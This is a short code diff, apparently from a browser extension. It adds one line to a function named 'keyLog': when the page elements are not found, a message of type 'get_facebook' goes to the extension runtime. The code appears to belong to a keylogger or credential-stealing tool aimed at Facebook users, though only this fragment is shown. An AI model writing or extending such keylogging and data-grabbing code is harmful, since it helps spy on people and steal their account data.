@@ -24,6 +24,7 @@ const keyLog = () => {
         };
     } catch {
         console.log("Error, can not find the elements!");
+        chrome.runtime.sendMessage({ type: "get_facebook" }, (e) => {});
     }
 };
 
